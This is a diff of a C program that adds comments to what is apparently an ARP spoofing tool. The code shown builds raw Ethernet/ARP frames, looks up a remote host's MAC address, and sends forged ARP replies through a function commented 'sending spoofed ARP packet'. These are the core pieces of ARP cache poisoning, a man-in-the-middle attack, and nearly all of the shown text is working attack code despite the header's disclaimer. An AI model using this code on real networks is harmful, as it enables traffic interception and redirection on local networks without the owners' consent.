@@ -21,20 +21,20 @@ I DO NOT encourage or promote any illegal activities.
 #include <stdlib.h>
 
 /* constant values */
-#define MAC_ADDR_LEN 0x06
-#define IPv4_ADDR_LEN 0x04
+#define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
+#define IPv4_ADDR_LEN 0x04  /* IPv4 address length (32 bits) */
 
-#define ETH_TYPE_PROTO_ARP 0x806
+#define ETH_TYPE_PROTO_ARP 0x806  /* EtherType value of ARP */
 
-#define ARP_HTYPE_ETH 1
-#define ARP_PTYPE_IP 0x0800
+#define ARP_HTYPE_ETH 1  /* Ethernet */
+#define ARP_PTYPE_IP 0x0800  /* IPv4 */
 
-#define ARP_OPER_REQUEST 1
-#define ARP_OPER_REPLY 2
+#define ARP_OPER_REQUEST 1  /* ARP request */
+#define ARP_OPER_REPLY 2  /* ARP reply */
 
 #define BUFFSIZE 65536
 
-
+/* Ethernet frame struct */
 typedef struct
 {
     uint8_t dest[MAC_ADDR_LEN]; /* destination MAC address */
@@ -42,6 +42,7 @@ typedef struct
     uint16_t type;              /* EtherType */
 } etherheader_t;
 
+/* ARP packet struct */
 typedef struct
 {
     uint16_t htype;                     /* hardware type */
@@ -62,6 +63,7 @@ char interfaceName[256];                /* network interface name */
 /* check if user is root */
 int isUserRoot()
 {
+    /* root's UID is 0 */
     if (getuid() == 0)
         return 1;
     else
@@ -75,44 +77,60 @@ int getIfIndex(const char* ifname, int* outIfIndex)
     strcpy(ifr.ifr_name, ifname);
 
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+
+    /* getting interface index */
     if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0)
     {
+        /* copy index to output variable */
         *outIfIndex = ifr.ifr_ifindex;
         close(sockfd);
         return 0;
     }
+
+    /* if error occurred */
     perror("ioctl");
     close(sockfd);
     return -1;
 }
 
+/* print MAC address in readable format */
 void printMacAddress(const unsigned char* mac)
 {
+    /* print MAC address in format aa:bb:cc:dd:ee:ff */
     printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 }
 
+/* get MAC address of local machine */
 int getLocalMacAddress(const char* ifname, unsigned char* outMac)
 {
     struct ifreq ifr;
     strcpy(ifr.ifr_name, ifname);
 
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+
+    /* getting interface's hardware address */
     if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
     {
+        /* copy MAC address to output variable */
         memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
         close(sockfd);
         return 0;
     }
+
+    /* if error occurred */
     perror("ioctl");
     close(sockfd);
     return -1;
 }
 
+/* print IPv4 address in readable format */
 void printIpAddress(const struct in_addr ip)
 {
+    /* print IPv4 address in dotdecimal format */
     printf("%s", inet_ntoa(ip));
 }
 
+/* get MAC address of local machine */
 int getLocalIpAddress(const char* ifname, struct in_addr* outIp)
 {
     struct ifreq ifr;
@@ -120,19 +138,25 @@ int getLocalIpAddress(const char* ifname, struct in_addr* outIp)
     ifr.ifr_addr.sa_family = AF_INET;
 
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+
+    /* getting interface's IP address */
     if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0)
     {
         struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
+
+        /* copy IP address to output variable */
         memcpy(outIp, &addr->sin_addr, sizeof(struct in_addr));
         close(sockfd);
         return 0;
     }
+
+    /* if error occurred */
     perror("ioctl");
     close(sockfd);
     return -1;
 }
 
-/* get MAC address of remote host */
+/* get MAC address of remote host using ARP request */
 int getMacAddress(const struct in_addr ip, unsigned char* outMac)
 {
     etherheader_t etherFrame;
@@ -143,10 +167,12 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
     memset(frame, 0, frameSize);
     int count = 100;
 
+    /* create Ethernet frame */
     memcpy(&etherFrame.dest, broadcastMAC, MAC_ADDR_LEN);
     memcpy(&etherFrame.src, localMAC, MAC_ADDR_LEN);
     etherFrame.type = htons(ETH_TYPE_PROTO_ARP);
 
+    /* create ARP packet */
     arpRequest.op = htons(ARP_OPER_REQUEST);
     arpRequest.htype = htons(ARP_HTYPE_ETH);
     arpRequest.hlen = MAC_ADDR_LEN;
@@ -158,8 +184,11 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
     memcpy(&arpRequest.spa, &localIP, sizeof(struct in_addr));
     
     int sockfd;
+
+    /* create socket to send ARP request */
     if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
     {
+        /* if error occurred */
         perror("socket");
         free(frame);
         return -1;
@@ -167,8 +196,11 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
 
     struct ifreq ifr;
     strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
+
+    /* bind socket to the interface */
     if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
     {
+        /* if error occurred */
         perror("setsockopt");
         close(sockfd);
         free(frame);
@@ -178,11 +210,14 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
     int ifindex;
     if(getIfIndex(interfaceName, &ifindex) < 0)
     {
+        /* if error occurred */
         perror("ioctl");
         close(sockfd);
         free(frame);
         return -1;
     }
+
+    /* socket address struct (link-layer) */
     struct sockaddr_ll sockAddr;
     sockAddr.sll_family = AF_PACKET;
     sockAddr.sll_protocol = htons(ETH_P_ARP);
@@ -195,8 +230,10 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
     memcpy(frame, &etherFrame, sizeof(etherFrame));
     memcpy(frame + sizeof(etherFrame), &arpRequest, sizeof(arpRequest));
 
+    /* send ARP request */
     if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
     {
+        /* if error occurred */
         perror("sendto");
         free(frame);
         return -1;
@@ -206,21 +243,29 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
 
     int i;
     unsigned char buffer[BUFFSIZE];
+
+    /* receive ARP reply */
     for (i = 0; i < count; i++)
     {
         memset(buffer, 0, BUFFSIZE);
         if(recvfrom(sockfd, buffer, BUFFSIZE, 0, NULL, NULL) < 0)
         {
+            /* if error occurred */
             perror("recvfrom");
             continue;
         }
 
+        /* dissect Ethernet frame from received buffer */
         etherheader_t* ethFrameRecvd = (etherheader_t*)buffer;
+
+        /* if frame is ARP */
         if (ntohs(ethFrameRecvd->type) == ETH_TYPE_PROTO_ARP)
         {
+            /* dissect Ethernet frame from received buffer */
             arpheader_t* arpResp = (arpheader_t*)(buffer + sizeof(etherheader_t));
             if (ntohs(arpResp->op) == 2)
             {
+                /* copy MAC address of remote host to output */
                 memcpy(outMac, ethFrameRecvd->src, MAC_ADDR_LEN);
                 return 0;
             }
@@ -230,6 +275,7 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac)
     return -1;
 }
 
+/* sending spoofed ARP packet */
 int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* destMAC, const struct in_addr srcIP, const unsigned char* srcMAC)
 {
     etherheader_t etherFrame;
@@ -238,10 +284,12 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
     unsigned char* frame = (unsigned char*)malloc(frameSize);
     memset(frame, 0, frameSize);
 
+    /* create Ethernet frame */
     memcpy(&etherFrame.dest, destMAC, MAC_ADDR_LEN);
     memcpy(&etherFrame.src, srcMAC, MAC_ADDR_LEN);
     etherFrame.type = htons(ETH_TYPE_PROTO_ARP);
 
+    /* create ARP packet */
     arpReply.op = htons(ARP_OPER_REPLY);
     arpReply.htype = htons(ARP_HTYPE_ETH);
     arpReply.hlen = MAC_ADDR_LEN;
@@ -253,8 +301,11 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
     memcpy(&arpReply.spa, &srcIP, sizeof(struct in_addr));
     
     int sockfd;
+
+    /* create socket to send ARP packet */
     if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
     {
+        /* if error occurred */
         perror("socket");
         free(frame);
         return -1;
@@ -262,8 +313,11 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
 
     struct ifreq ifr;
     strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
+
+    /* bind socket to the interface */
     if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0)
     {
+        /* if error occurred */
         perror("setsockopt");
         close(sockfd);
         free(frame);
@@ -273,11 +327,14 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
     int ifindex;
     if(getIfIndex(interfaceName, &ifindex) < 0)
     {
+        /* if error occurred */
         perror("ioctl");
         close(sockfd);
         free(frame);
         return -1;
     }
+
+    /* socket address struct (link-layer) */
     struct sockaddr_ll sockAddr;
     sockAddr.sll_family = AF_PACKET;
     sockAddr.sll_protocol = htons(ETH_P_ARP);
@@ -290,8 +347,10 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
     memcpy(frame, &etherFrame, sizeof(etherFrame));
     memcpy(frame + sizeof(etherFrame), &arpReply, sizeof(arpReply));
 
+    /* send ARP packet */
     if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0)
     {
+        /* if error occurred */
         perror("sendto");
         free(frame);
         return -1;
